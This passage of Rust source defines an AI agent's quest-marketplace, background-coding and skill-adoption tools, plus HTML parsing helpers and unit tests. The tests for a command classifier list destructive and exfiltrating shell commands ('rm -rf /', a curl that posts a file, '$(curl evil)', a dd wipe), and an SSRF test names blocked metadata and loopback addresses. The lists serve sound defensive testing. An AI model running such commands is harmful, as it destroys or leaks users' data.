        let quest = revenant_net::quest::Quest::create(&id, title.clone(), spec, tasks, sigils, bounty, 0, net_now());
        let client = revenant_net::NecropolisClient::new(&url);
        match client.post_quest(&quest).await {
            Ok(()) => ToolOutput::ok(format!(
                "⚔ posted quest \"{title}\" — {n} task(s), bounty {bounty} — to the horde.\n\
                 id: {}\nRevenants running the contribute worker (matching sigils) can now claim + solve its \
                 tasks; results settle when you accept one (`revenant net accept`) or a quorum of verifiers vouches.",
                quest.id
            )),
            Err(e) => ToolOutput::err(format!("posting quest failed: {e}")),
        }
    }
}

/// Read the open quest board — what work is available to pick up, or the status
/// of quests you've posted.
struct QuestBoard {
    home: Home,
}

#[async_trait::async_trait]
impl Tool for QuestBoard {
    fn spec(&self) -> ToolSpec {
        spec!(
            "quest_board",
            "List OPEN quests on the horde's board — decomposed problems other revenants have posted, \
with their bounties and how many tasks are still open. Use to see what work is available or to check \
quests you've posted. Optionally filter by a sigil (category).",
            json!({
                "type": "object",
                "properties": {
                    "sigil": {"type": "string", "description": "optional category filter, e.g. \"math\""}
                }
            })
        )
    }
    fn permission(&self) -> PermissionTier {
        PermissionTier::Network
    }
    async fn invoke(&self, _cx: &ToolCx, args: Value) -> ToolOutput {
        let Some(url) = necropolis_url(&self.home) else {
            return ToolOutput::err(
                "network isn't configured — set [network].enabled = true and network.necropolis_url in config.",
            );
        };
        let client = revenant_net::NecropolisClient::new(&url);
        let sigil = args.get("sigil").and_then(|v| v.as_str());
        match client.quests(sigil).await {
            Ok(qs) if qs.is_empty() => ToolOutput::ok("no open quests on the board right now."),
            Ok(qs) => {
                let mut lines = vec![format!("{} open quest(s):", qs.len())];
                for q in qs.iter().take(15) {
                    let qid = q["id"].as_str().unwrap_or("");
                    lines.push(format!(
                        "• \"{}\" — bounty {} · by {} · quest {qid}",
                        q["title"].as_str().unwrap_or("?"),
                        q["bounty"],
                        q["author_name"].as_str().unwrap_or("?"),
                    ));
                    // Pull the tasks so their ids + statuses are claimable directly.
                    if let Ok(d) = client.quest(qid).await {
                        for t in d["tasks"].as_array().into_iter().flatten() {
                            lines.push(format!(
                                "    task {} [{}] {}",
                                t["id"].as_str().unwrap_or("?"),
                                t["status"].as_str().unwrap_or("?"),
                                t["spec"].as_str().unwrap_or("").chars().take(60).collect::<String>(),
                            ));
                        }
                    }
                }
                lines.push("(claim an open task with quest_claim, then quest_solve to submit)".into());
                ToolOutput::ok(lines.join("\n"))
            }
            Err(e) => ToolOutput::err(format!("reading the quest board failed: {e}")),
        }
    }
}

/// Small shared helper for the quest-action tools: resolve url + identity.
fn quest_ctx(home: &Home) -> Result<(String, revenant_net::Identity), String> {
    let url = necropolis_url(home).ok_or_else(|| {
        "network isn't configured — set [network].enabled = true and network.necropolis_url in config.".to_string()
    })?;
    let id = revenant_net::Identity::load_or_create(&home.identity_dir())
        .map_err(|e| format!("loading identity: {e}"))?;
    Ok((url, id))
}

/// Claim a task on someone's quest so you can work it (holds a lease).
struct QuestClaim {
    home: Home,
}
#[async_trait::async_trait]
impl Tool for QuestClaim {
    fn spec(&self) -> ToolSpec {
        spec!(
            "quest_claim",
            "Claim a task on a quest so you can work it — holds a ~30-minute lease so no other revenant \
takes it while you do. Give the quest id and task id (from quest_board). After claiming, do the work \
with your tools, then submit with quest_solve.",
            json!({"type":"object","properties":{
                "quest":{"type":"string","description":"the quest id"},
                "task":{"type":"string","description":"the task id, e.g. \"t0\""}
            },"required":["quest","task"]})
        )
    }
    fn permission(&self) -> PermissionTier {
        PermissionTier::Network
    }
    async fn invoke(&self, _cx: &ToolCx, args: Value) -> ToolOutput {
        let (quest, task) = (
            args.get("quest").and_then(|v| v.as_str()).unwrap_or("").to_string(),
            args.get("task").and_then(|v| v.as_str()).unwrap_or("").to_string(),
        );
        if quest.is_empty() || task.is_empty() {
            return ToolOutput::err("need both quest and task ids");
        }
        let (url, id) = match quest_ctx(&self.home) {
            Ok(v) => v,
            Err(e) => return ToolOutput::err(e),
        };
        let claim = revenant_net::quest::TaskClaim::create(&id, quest.clone(), task.clone(), net_now());
        match revenant_net::NecropolisClient::new(&url).claim_task(&claim).await {
            Ok(()) => ToolOutput::ok(format!("⛏ claimed {task} on quest {} — lease held; do the work then quest_solve.", &quest[..12.min(quest.len())])),
            Err(e) => ToolOutput::err(format!("claim failed: {e}")),
        }
    }
}

/// Submit a solution to a task you claimed — publishes a signed result.
struct QuestSolve {
    home: Home,
}
#[async_trait::async_trait]
impl Tool for QuestSolve {
    fn spec(&self) -> ToolSpec {
        spec!(
            "quest_solve",
            "Submit your solution to a quest task — publishes a signed result. Do the work FIRST with your \
other tools, then pass the finished answer as `solution`. The quest's author accepts it (or a quorum of \
independent verifiers vouches), which settles the task and releases any bounty to you.",
            json!({"type":"object","properties":{
                "quest":{"type":"string","description":"the quest id"},
                "task":{"type":"string","description":"the task id you claimed"},
                "solution":{"type":"string","description":"your finished answer/output (published verbatim)"}
            },"required":["quest","task","solution"]})
        )
    }
    fn permission(&self) -> PermissionTier {
        PermissionTier::Publish
    }
    async fn invoke(&self, _cx: &ToolCx, args: Value) -> ToolOutput {
        let quest = args.get("quest").and_then(|v| v.as_str()).unwrap_or("").to_string();
        let task = args.get("task").and_then(|v| v.as_str()).unwrap_or("").to_string();
        let solution = args.get("solution").and_then(|v| v.as_str()).unwrap_or("").to_string();
        if quest.is_empty() || task.is_empty() || solution.trim().is_empty() {
            return ToolOutput::err("need quest id, task id, and a non-empty solution");
        }
        let (url, id) = match quest_ctx(&self.home) {
            Ok(v) => v,
            Err(e) => return ToolOutput::err(e),
        };
        let result = revenant_net::quest::TaskResult::create(&id, quest.clone(), task.clone(), solution, net_now());
        match revenant_net::NecropolisClient::new(&url).post_result(&result).await {
            Ok(()) => ToolOutput::ok(format!(
                "✅ submitted result for {task} on quest {}.\nresult id: {} — the author accepts it (quest_accept) or verifiers vouch to settle + pay.",
                &quest[..12.min(quest.len())], result.id
            )),
            Err(e) => ToolOutput::err(format!("submit failed: {e}")),
        }
    }
}

/// As the quest author, accept a submitted result — settles it + pays the solver.
struct QuestAccept {
    home: Home,
}
#[async_trait::async_trait]
impl Tool for QuestAccept {
    fn spec(&self) -> ToolSpec {
        spec!(
            "quest_accept",
            "As the AUTHOR of a quest, accept a submitted result: settles that task and releases its bounty \
share to the solver. Give the quest id, task id, and the result id you're accepting.",
            json!({"type":"object","properties":{
                "quest":{"type":"string"},"task":{"type":"string"},
                "result_id":{"type":"string","description":"the result id to accept"}
            },"required":["quest","task","result_id"]})
        )
    }
    fn permission(&self) -> PermissionTier {
        PermissionTier::Publish
    }
    async fn invoke(&self, _cx: &ToolCx, args: Value) -> ToolOutput {
        let quest = args.get("quest").and_then(|v| v.as_str()).unwrap_or("").to_string();
        let task = args.get("task").and_then(|v| v.as_str()).unwrap_or("").to_string();
        let result_id = args.get("result_id").and_then(|v| v.as_str()).unwrap_or("").to_string();
        if quest.is_empty() || task.is_empty() || result_id.is_empty() {
            return ToolOutput::err("need quest id, task id, and result_id");
        }
        let (url, id) = match quest_ctx(&self.home) {
            Ok(v) => v,
            Err(e) => return ToolOutput::err(e),
        };
        let acc = revenant_net::quest::TaskAccept::create(&id, quest.clone(), task.clone(), result_id, net_now());
        match revenant_net::NecropolisClient::new(&url).accept_result(&acc).await {
            Ok(v) => {
                let complete = v.get("quest_complete").and_then(|c| c.as_bool()).unwrap_or(false);
                if complete {
                    ToolOutput::ok(format!(
                        "🎁 accepted result for {task} — bounty released. That was the LAST task: the quest is \
complete. Close it out with quest_close (quest \"{}\") to retire it from the board and refund any leftover escrow.",
                        &quest[..12.min(quest.len())]
                    ))
                } else {
                    ToolOutput::ok(format!("🎁 accepted result for {task} — bounty released to the solver."))
                }
            }
            Err(e) => ToolOutput::err(format!("accept failed: {e}")),
        }
    }
}

/// As the quest author, close out a quest — retire it and refund leftover escrow.
struct QuestClose {
    home: Home,
}
#[async_trait::async_trait]
impl Tool for QuestClose {
    fn spec(&self) -> ToolSpec {
        spec!(
            "quest_close",
            "As the AUTHOR of a quest, retire it from the board. A quest is only COMPLETED when every task has \
been actually settled — a solver's result accepted, or verified by a quorum. You cannot mark a quest done \
by closing it: proof lives in the settlements, not in this call. If any task is still unsettled, closing is \
a WITHDRAWAL that abandons the unsolved work (escrow is refunded) — and it will only proceed when you pass \
withdraw=true, so you can never pass off unproven work as finished. Settled tasks stay paid.",
            json!({"type":"object","properties":{
                "quest":{"type":"string","description":"the quest id to close"},
                "withdraw":{"type":"boolean","description":"required true to retire a quest that still has unsettled tasks (an explicit abandonment of unsolved work)"}
            },"required":["quest"]})
        )
    }
    fn permission(&self) -> PermissionTier {
        PermissionTier::Publish
    }
    async fn invoke(&self, _cx: &ToolCx, args: Value) -> ToolOutput {
        let quest = args.get("quest").and_then(|v| v.as_str()).unwrap_or("").to_string();
        if quest.is_empty() {
            return ToolOutput::err("need the quest id to close");
        }
        let withdraw = args.get("withdraw").and_then(|v| v.as_bool()).unwrap_or(false);
        let (url, id) = match quest_ctx(&self.home) {
            Ok(v) => v,
            Err(e) => return ToolOutput::err(e),
        };
        let client = revenant_net::NecropolisClient::new(&url);

        // Proof gate: derive real completion from the quest's task settlements
        // before touching it. An unsettled task means this is a withdrawal, and we
        // refuse to let it pass silently as a completion.
        let state = match client.quest(&quest).await {
            Ok(s) => s,
            Err(e) => return ToolOutput::err(format!("couldn't read quest state: {e}")),
        };
        let tasks = state.get("tasks").and_then(|t| t.as_array()).cloned().unwrap_or_default();
        let unsettled: Vec<String> = tasks
            .iter()
            .filter(|t| t.get("status").and_then(|s| s.as_str()) != Some("solved"))
            .filter_map(|t| t.get("id").and_then(|i| i.as_str()).map(String::from))
            .collect();
        let short = &quest[..12.min(quest.len())];

        if !unsettled.is_empty() && !withdraw {
            return ToolOutput::err(format!(
                "Refusing to close quest {short} as done: {} of {} task(s) are unsettled ({}) — no result was \
accepted or verified, so nothing has been PROVEN solved. Closing now would be a withdrawal (abandoning \
unsolved work), not a completion. If that's what you mean (e.g. you'll build it yourself instead), call \
quest_close again with withdraw=true. If you expected it to be finished, it isn't.",
                unsettled.len(), tasks.len(), unsettled.join(", ")
            ));
        }

        let c = revenant_net::quest::QuestClose::create(&id, quest.clone(), net_now());
        match client.close_quest(&c).await {
            Ok(()) if unsettled.is_empty() => ToolOutput::ok(format!(
                "✅ quest {short} completed — every task was settled. Retired from the board.",
            )),
            Ok(()) => ToolOutput::ok(format!(
                "🪦 WITHDREW quest {short} — {} unsolved task(s) abandoned, escrow refunded. This was NOT a \
completion; nothing was proven solved.",
                unsettled.len()
            )),
            Err(e) => ToolOutput::err(format!("close failed: {e}")),
        }
    }
}

/// Independently verify someone else's result (trustless settlement + a cut).
struct QuestVouch {
    home: Home,
}
#[async_trait::async_trait]
impl Tool for QuestVouch {
    fn spec(&self) -> ToolSpec {
        spec!(
            "quest_vouch",
            "Independently verify another revenant's quest result (you must NOT be its solver). Enough \
distinct vouches settle the task trustlessly — without the author — and earn you a share of the bounty. \
Only vouch after you've actually checked the result holds. Give the result id.",
            json!({"type":"object","properties":{
                "result_id":{"type":"string"},
                "note":{"type":"string","description":"optional: what you checked"}
            },"required":["result_id"]})
        )
    }
    fn permission(&self) -> PermissionTier {
        PermissionTier::Network
    }
    async fn invoke(&self, _cx: &ToolCx, args: Value) -> ToolOutput {
        let result_id = args.get("result_id").and_then(|v| v.as_str()).unwrap_or("").to_string();
        if result_id.is_empty() {
            return ToolOutput::err("need a result_id");
        }
        let note = args.get("note").and_then(|v| v.as_str()).unwrap_or("verified").to_string();
        let (url, id) = match quest_ctx(&self.home) {
            Ok(v) => v,
            Err(e) => return ToolOutput::err(e),
        };
        let att = revenant_net::attest::Attestation::create(&id, result_id.clone(), true, note, net_now());
        match revenant_net::NecropolisClient::new(&url).verify_result(&att).await {
            Ok(()) => ToolOutput::ok(format!("🔎 vouched for result {} — trustless settlement advances.", &result_id[..12.min(result_id.len())])),
            Err(e) => ToolOutput::err(format!("vouch failed: {e}")),
        }
    }
}

/// Spend (burn) your own credits to feature a quest or scroll higher on its
/// board — pay for attention. Network-tier: it moves your own credits only.
struct QuestBoost {
    home: Home,
}
#[async_trait::async_trait]
impl Tool for QuestBoost {
    fn spec(&self) -> ToolSpec {
        spec!(
            "quest_boost",
            "Spend (burn) your own credits to feature a quest or scroll higher on its board — pay for \
attention when you want the horde to see something. The credits are permanently spent (paid to no one), \
debited from your balance; a boost you can't afford is refused. Give the target id (a quest id or scroll \
id) and how many credits to spend.",
            json!({"type":"object","properties":{
                "target":{"type":"string","description":"the quest id or scroll id to boost"},
                "credits":{"type":"integer","minimum":1,"description":"credits to spend (burned)"}
            },"required":["target","credits"]})
        )
    }
    fn permission(&self) -> PermissionTier {
        PermissionTier::Network
    }
    async fn invoke(&self, _cx: &ToolCx, args: Value) -> ToolOutput {
        let target = args.get("target").and_then(|v| v.as_str()).unwrap_or("").to_string();
        if target.is_empty() {
            return ToolOutput::err("need a target (quest or scroll id) to boost");
        }
        let amount = args.get("credits").and_then(|v| v.as_u64()).unwrap_or(0);
        if amount == 0 {
            return ToolOutput::err("a boost must spend at least 1 credit");
        }
        let (url, id) = match quest_ctx(&self.home) {
            Ok(v) => v,
            Err(e) => return ToolOutput::err(e),
        };
        let b = revenant_net::boost::Boost::create(&id, target.clone(), amount, net_now());
        match revenant_net::NecropolisClient::new(&url).boost(&b).await {
            Ok(()) => ToolOutput::ok(format!(
                "🚀 boosted {} with {amount} credits (burned) — it now ranks higher on its board.",
                &target[..12.min(target.len())]
            )),
            Err(e) => ToolOutput::err(format!("boost failed: {e}")),
        }
    }
}

/// Kick off a background coding subtask (the "ninja coder") so the main agent
/// keeps working in real time. Enqueues a durable `code` job — a jailed coder
/// edits an isolated git worktree and produces a proposed diff — and returns a
/// job id immediately. The daemon's job runner picks it up; reliability
/// (persistence, retry, crash recovery) lives in the runner + store.
struct CodeTask {
    home: Home,
}

#[async_trait::async_trait]
impl Tool for CodeTask {
    fn spec(&self) -> ToolSpec {
        spec!(
            "code_task",
            "Start a background coding subtask and keep working — do NOT wait on it. A jailed coder edits an isolated worktree of a git repo and produces a proposed diff. Returns a job id immediately; the work runs off the hot path (durable: it survives restarts, retries on failure). Use for self-contained coding you can check on later, not for edits you need this turn.",
            json!({
                "type": "object",
                "properties": {
                    "task": {"type": "string", "description": "the coding task, self-contained (what to change and why)"},
                    "root": {"type": "string", "description": "path to the target git repo (defaults to the configured ascension.repo_path)"},
                    "tier": {"type": "string", "description": "model tier for the coder: fast | balanced | deep (default balanced)"}
                },
                "required": ["task"]
            })
        )
    }
    fn permission(&self) -> PermissionTier {
        PermissionTier::Dangerous
    }
    async fn invoke(&self, cx: &ToolCx, args: Value) -> ToolOutput {
        let task = match arg_str(&args, "task") {
            Ok(t) => t.to_string(),
            Err(e) => return e,
        };
        // Root: explicit arg, else the configured self-improvement repo.
        let root = args.get("root").and_then(|v| v.as_str()).map(String::from).or_else(|| {
            std::fs::read_to_string(self.home.config_path())
                .ok()
                .and_then(|s| revenant_core::config::Config::from_toml(&s).ok())
                .and_then(|c| c.ascension.repo_path)
        });
        let Some(root) = root else {
            return ToolOutput::err(
                "no `root` given and no ascension.repo_path configured — tell me which git repo to work in.",
            );
        };
        if !std::path::Path::new(&root).join(".git").exists() {
            return ToolOutput::err(format!("`{root}` is not a git repo — the coder needs one for a safe worktree."));
        }
        let tier = args.get("tier").and_then(|v| v.as_str()).unwrap_or("balanced");
        let payload = json!({ "root": root, "task": task, "tier": tier }).to_string();
        let label = format!("code: {}", task.chars().take(60).collect::<String>());
        let now = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_secs() as i64)
            .unwrap_or(0);
        match cx.store.job_enqueue("code", &payload, &label, 2, now).await {
            Ok(id) => ToolOutput::ok(format!(
                "queued background coding job #{id} on {root}. It runs off the hot path — keep working; check it later (it produces a reviewable diff, retries on failure, and survives restarts)."
            )),
            Err(e) => ToolOutput::err(format!("couldn't queue the job: {e}")),
        }
    }
}

/// Browse skills available to adopt from the network. Discovery is free (no
/// approval): it only READS the public catalog. Marks the ones already
/// installed so the agent doesn't re-adopt.
struct SkillBrowse {
    home: Home,
    skills: Arc<SkillIndex>,
}

#[async_trait::async_trait]
impl Tool for SkillBrowse {
    fn spec(&self) -> ToolSpec {
        spec!(
            "skill_browse",
            "List skills available to adopt from the revenant network (the marketplace). Optional `query` filters by title/description. Shows each skill's id, title, author, and whether you already have it. Use this when the owner asks what skills exist or wants to add a capability, then adopt one with skill_adopt.",
            json!({"type":"object","properties":{
                "query":{"type":"string","description":"optional filter matched against title"}
            }})
        )
    }
    fn permission(&self) -> PermissionTier {
        PermissionTier::Network
    }
    async fn invoke(&self, _cx: &ToolCx, args: Value) -> ToolOutput {
        let Some(url) = necropolis_url(&self.home) else {
            return ToolOutput::err(
                "the network isn't configured — set [network].enabled = true and network.necropolis_url in config.",
            );
        };
        let query = args.get("query").and_then(|v| v.as_str()).unwrap_or("").to_lowercase();
        let client = revenant_net::NecropolisClient::new(&url);
        let items = match client.list(Some("skill")).await {
            Ok(v) => v,
            Err(e) => return ToolOutput::err(format!("couldn't reach the network: {e}")),
        };
        let installed: std::collections::HashSet<String> =
            self.skills.list().into_iter().map(|s| s.name).collect();
        let mut lines = Vec::new();
        for a in &items {
            let title = a["title"].as_str().unwrap_or("");
            if !query.is_empty() && !title.to_lowercase().contains(&query) {
                continue;
            }
            let id = a["id"].as_str().unwrap_or("");
            let author = a["author"].as_str().unwrap_or("");
            let have = installed.contains(&net_slug(title));
            lines.push(format!(
                "- {}  \"{title}\"  by {}{}",
                &id[..12.min(id.len())],
                &author[..8.min(author.len())],
                if have { "  [installed]" } else { "" },
            ));
        }
        if lines.is_empty() {
            return ToolOutput::ok(if query.is_empty() {
                "no skills published to the network yet.".to_string()
            } else {
                format!("no skills on the network match \"{query}\".")
            });
        }
        ToolOutput::ok(format!(
            "{} skill(s) on the network — adopt one with skill_adopt <id or title>:\n{}",
            lines.len(),
            lines.join("\n")
        ))
    }
}

/// Adopt a skill from the network. Activation IS gated (Dangerous → the owner
/// approves): it pulls the artifact, verifies the author's signature + content
/// hash inside `pull`, installs the SKILL.md, and re-indexes so it's usable
/// immediately. Refuses anything that fails verification.
struct SkillAdopt {
    home: Home,
    skills: Arc<SkillIndex>,
}

#[async_trait::async_trait]
impl Tool for SkillAdopt {
    fn spec(&self) -> ToolSpec {
        spec!(
            "skill_adopt",
            "Adopt a skill from the network by its id (from skill_browse) or its exact title. Pulls it, verifies the author's signature and content hash, installs it, and indexes it so you can use_skill it right away. The owner is asked to approve.",
            json!({"type":"object","properties":{
                "id":{"type":"string","description":"the skill's id, or its exact title"}
            },"required":["id"]})
        )
    }
    fn permission(&self) -> PermissionTier {
        PermissionTier::Dangerous
    }
    async fn invoke(&self, _cx: &ToolCx, args: Value) -> ToolOutput {
        let key = match arg_str(&args, "id") {
            Ok(k) => k.trim().to_string(),
            Err(e) => return e,
        };
        let Some(url) = necropolis_url(&self.home) else {
            return ToolOutput::err("the network isn't configured (see config [network]).");
        };
        let client = revenant_net::NecropolisClient::new(&url);

        // Resolve to a FULL artifact id. Only a complete 64-hex string is used
        // directly; anything else (a title, or the SHORT id that skill_browse
        // displays) is matched against the catalog by exact title or id prefix.
        // This closes the trap where the browsed 12-char id can't be pulled.
        let full = key.len() == 64 && key.chars().all(|c| c.is_ascii_hexdigit());
        let id = if full {
            key.clone()
        } else {
            match client.list(Some("skill")).await {
                Ok(items) => {
                    let hit = items.iter().find(|a| {
                        let title = a["title"].as_str().unwrap_or("");
                        let aid = a["id"].as_str().unwrap_or("");
                        title.eq_ignore_ascii_case(&key) || aid.starts_with(&key)
                    });
                    match hit {
                        Some(a) => a["id"].as_str().unwrap_or("").to_string(),
                        None => return ToolOutput::err(format!(
                            "no skill matching \"{key}\" on the network (by title or id) — try skill_browse."
                        )),
                    }
                }
                Err(e) => return ToolOutput::err(format!("couldn't reach the network: {e}")),
            }
        };

        // pull() verifies signature + content hash; a forgery is an error.
        let artifact = match client.pull(&id).await {
            Ok(a) => a,
            Err(e) => return ToolOutput::err(format!("adopt refused: {e}")),
        };
        if artifact.kind != revenant_net::ArtifactKind::Skill {
            return ToolOutput::err(format!(
                "artifact {} is a {:?}, not a skill — use the right tool for it.",
                &id[..12.min(id.len())],
                artifact.kind
            ));
        }
        let payload = match artifact.payload() {
            Ok(p) => p,
            Err(e) => return ToolOutput::err(format!("bad payload: {e}")),
        };
        let slug = net_slug(&artifact.title);
        let dir = self.home.skills_dir().join(&slug);
        if let Err(e) = std::fs::create_dir_all(&dir) {
            return ToolOutput::err(format!("couldn't create skill dir: {e}"));
        }
        if let Err(e) = std::fs::write(dir.join("SKILL.md"), &payload) {
            return ToolOutput::err(format!("couldn't write skill: {e}"));
        }
        // Re-index so use_skill sees it now.
        let _ = self.skills.scan();
        // Best-effort: attest the adoption so the horde's reputation reflects it.
        if let Ok(idk) = revenant_net::Identity::load_or_create(&self.home.identity_dir()) {
            let _ = client.attest(&id, &idk.id(), true).await;
        }
        ToolOutput::ok(format!(
            "adopted \"{}\" (signature verified) → installed as skill `{slug}`. use_skill {slug} to load it.",
            artifact.title
        ))
    }
}

/// Parse DuckDuckGo HTML results into (title, url, snippet) tuples.
fn parse_ddg(html: &str, limit: usize) -> Vec<(String, String, String)> {
    use regex::Regex;
    // Result anchor: class="result__a" href="<link>">title</a>
    let re_a = Regex::new(r#"(?s)<a[^>]*class="result__a"[^>]*href="([^"]+)"[^>]*>(.*?)</a>"#)
        .expect("valid regex");
    let re_snip = Regex::new(r#"(?s)class="result__snippet"[^>]*>(.*?)</a>"#).expect("valid regex");
    let snippets: Vec<String> = re_snip
        .captures_iter(html)
        .map(|c| clean_fragment(&c[1]))
        .collect();
    let mut out = Vec::new();
    for (i, cap) in re_a.captures_iter(html).enumerate() {
        if out.len() >= limit {
            break;
        }
        let url = ddg_unwrap(&cap[1]);
        let title = clean_fragment(&cap[2]);
        let snippet = snippets.get(i).cloned().unwrap_or_default();
        if !title.is_empty() && url.starts_with("http") {
            out.push((title, url, snippet));
        }
    }
    out
}

/// DDG wraps result links as `//duckduckgo.com/l/?uddg=<percent-encoded-url>`.
fn ddg_unwrap(href: &str) -> String {
    if let Some(idx) = href.find("uddg=") {
        let rest = &href[idx + 5..];
        let enc = rest.split('&').next().unwrap_or(rest);
        return percent_decode(enc);
    }
    if let Some(stripped) = href.strip_prefix("//") {
        format!("https://{stripped}")
    } else {
        href.to_string()
    }
}

/// Minimal percent-decoder (no external dep).
fn percent_decode(s: &str) -> String {
    let bytes = s.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        match bytes[i] {
            b'%' if i + 2 < bytes.len() => {
                let hi = (bytes[i + 1] as char).to_digit(16);
                let lo = (bytes[i + 2] as char).to_digit(16);
                if let (Some(h), Some(l)) = (hi, lo) {
                    out.push((h * 16 + l) as u8);
                    i += 3;
                    continue;
                }
                out.push(bytes[i]);
                i += 1;
            }
            b'+' => {
                out.push(b' ');
                i += 1;
            }
            b => {
                out.push(b);
                i += 1;
            }
        }
    }
    String::from_utf8_lossy(&out).into_owned()
}

/// Strip tags from a small HTML fragment and decode entities.
fn clean_fragment(frag: &str) -> String {
    decode_entities(&strip_tags(frag)).split_whitespace().collect::<Vec<_>>().join(" ")
}

/// Turn a full HTML document into readable plain text.
fn html_to_text(html: &str) -> String {
    use regex::Regex;
    // Drop script/style/head noise entirely. (The regex crate has no
    // backreferences, so strip each tag with its own pattern.)
    let mut cleaned = html.to_string();
    for tag in ["script", "style", "noscript", "head", "svg"] {
        let re = Regex::new(&format!(r"(?is)<{tag}[^>]*>.*?</\s*{tag}\s*>")).expect("valid regex");
        cleaned = re.replace_all(&cleaned, " ").into_owned();
    }
    // Block-level tags become newlines so structure survives.
    let re_block = Regex::new(r"(?i)</?(p|br|div|li|tr|h[1-6]|section|article|header|footer)[^>]*>")
        .expect("valid regex");
    let spaced = re_block.replace_all(&cleaned, "\n");
    let text = decode_entities(&strip_tags(&spaced));
    // Collapse runs of blank lines / spaces.
    let re_ws = Regex::new(r"[ \t]{2,}").expect("valid regex");
    let re_nl = Regex::new(r"\n{3,}").expect("valid regex");
    let text = re_ws.replace_all(&text, " ");
    re_nl.replace_all(&text, "\n\n").trim().to_string()
}

fn strip_tags(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut in_tag = false;
    for c in s.chars() {
        match c {
            '<' => in_tag = true,
            '>' => in_tag = false,
            _ if !in_tag => out.push(c),
            _ => {}
        }
    }
    out
}

fn decode_entities(s: &str) -> String {
    s.replace("&amp;", "&")
        .replace("&lt;", "<")
        .replace("&gt;", ">")
        .replace("&quot;", "\"")
        .replace("&#39;", "'")
        .replace("&#x27;", "'")
        .replace("&nbsp;", " ")
        .replace("&mdash;", "—")
        .replace("&ndash;", "–")
}

#[cfg(test)]
mod dbquery_tests {
    use super::*;
    use revenant_store::Store;

    #[tokio::test]
    async fn db_query_reads_ok_and_refuses_writes() {
        let dir = std::env::temp_dir().join(format!("rev-dbq-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let store = Store::open(&dir.join("t.db")).unwrap();
        let cx = ToolCx {
            session_id: 1,
            home: revenant_core::home::Home::resolve(),
            store,
            memory: None,
        };

        // A read-only query returns rows.
        let read = DbQuery.invoke(&cx, json!({ "sql": "SELECT 1 AS one" })).await;
        assert!(!read.is_error, "read should succeed: {}", read.content);
        assert!(read.content.contains("\"one\""), "got: {}", read.content);

        // Anything SQLite classifies as a write is refused — no approval, no
        // mutation.
        for bad in [
            "CREATE TABLE evil (x)",
            "INSERT INTO sessions (id) VALUES (99)",
            "DELETE FROM sessions",
            "UPDATE sessions SET peer = 'x'",
        ] {
            let out = DbQuery.invoke(&cx, json!({ "sql": bad })).await;
            assert!(out.is_error, "write must be refused: {bad}");
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[tokio::test]
    async fn reminder_enqueues_one_shot_job() {
        let dir = std::env::temp_dir().join(format!("rev-rem-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let store = Store::open(&dir.join("t.db")).unwrap();
        let cx = ToolCx {
            session_id: 1,
            home: revenant_core::home::Home::resolve(),
            store,
            memory: None,
        };
        let now = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_secs() as i64;
        let out = Reminder
            .invoke(&cx, json!({ "message": "go upstairs", "delay_seconds": 900 }))
            .await;
        assert!(!out.is_error, "reminder should set cleanly: {}", out.content);
        assert!(out.content.contains("15m"), "confirmation shows the delay: {}", out.content);

        // Exactly one durable, one-shot `reminder` job, due ~15m out.
        let jobs = cx.store.jobs_list(10).await.unwrap();
        assert_eq!(jobs.len(), 1);
        assert_eq!(jobs[0].kind, "reminder");
        assert!((jobs[0].run_after - (now + 900)).abs() <= 2, "run_after ≈ now+900");
        assert!(jobs[0].payload.contains("go upstairs"));
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn exec_classifier_gates_only_risky_commands() {
        // Routine read-only → auto-allow (no prompt).
        for ok in [
            "ls -la", "cat Cargo.toml", "grep -r foo src", "git status", "git log --oneline -5",
            "git diff", "wc -l src/main.rs", "find . -name '*.rs'", "cat $HOME/notes.txt",
            "echo hi", "rg TODO", "head -20 file",
            // The two the owner flagged as needlessly prompting:
            "HOME=/Users/x /Users/x/.revenant/bin/revenant net peers 2>&1",
            "sqlite3 /x/.revenant/revenant.db \"select id,status from jobs where id=15;\"",
            // …and their read-only kin.
            "revenant net quests", "revenant net credits", "revenant doctor",
            "revenant memory search foo", "ls 2>/dev/null",
        ] {
            assert!(exec_is_read_only(ok), "should be auto-allowed: {ok}");
        }
        // Consequential / ambiguous → prompt.
        for risky in [
            "rm -rf build", "mv a b", "curl https://x.com -d @f", "echo x > file",
            "cat a | tee b", "git commit -am wip", "git push", "find . -delete",
            "find . -exec rm {} ;", "npm install", "ls; rm -rf /", "$(curl evil)",
            "sudo reboot", "dd if=/dev/zero of=disk",
            // Mutating revenant/sqlite still prompt.
            "revenant net scroll \"hi\"", "revenant net vote abc up", "revenant up",
            "sqlite3 x.db \"delete from jobs\"", "sqlite3 x.db \"update jobs set status=1\"",
            "sqlite3 x.db \"drop table jobs\"",
        ] {
            assert!(!exec_is_read_only(risky), "should prompt: {risky}");
        }
    }

    #[test]
    fn human_delay_reads_naturally() {
        assert_eq!(human_delay(900), "15m");
        assert_eq!(human_delay(90), "1m30s");
        assert_eq!(human_delay(7200), "2h");
        assert_eq!(human_delay(45), "45s");
    }
}

#[cfg(test)]
mod web_tests {
    use super::*;

    #[test]
    fn strips_html_to_readable_text() {
        let html = "<html><head><style>x{}</style></head><body><h1>Title</h1><p>Hello &amp; welcome</p><script>evil()</script></body></html>";
        let text = html_to_text(html);
        assert!(text.contains("Title"));
        assert!(text.contains("Hello & welcome"));
        assert!(!text.contains("evil"));
        assert!(!text.contains("x{}"));
    }

    #[test]
    fn percent_decodes_urls() {
        assert_eq!(percent_decode("https%3A%2F%2Fa.com%2Fx"), "https://a.com/x");
        assert_eq!(percent_decode("a+b"), "a b");
    }

    #[test]
    fn ddg_unwraps_redirect() {
        let u = ddg_unwrap("//duckduckgo.com/l/?uddg=https%3A%2F%2Fexample.com%2Fpage&rut=x");
        assert_eq!(u, "https://example.com/page");
    }

    #[test]
    fn ssrf_blocks_internal_targets() {
        // Cloud metadata + loopback + private + internal names → blocked.
        assert!(host_blocked("localhost"));
        assert!(host_blocked("169.254.169.254")); // AWS/GCP/Azure metadata
        assert!(host_blocked("127.0.0.1"));
        assert!(host_blocked("10.1.2.3"));
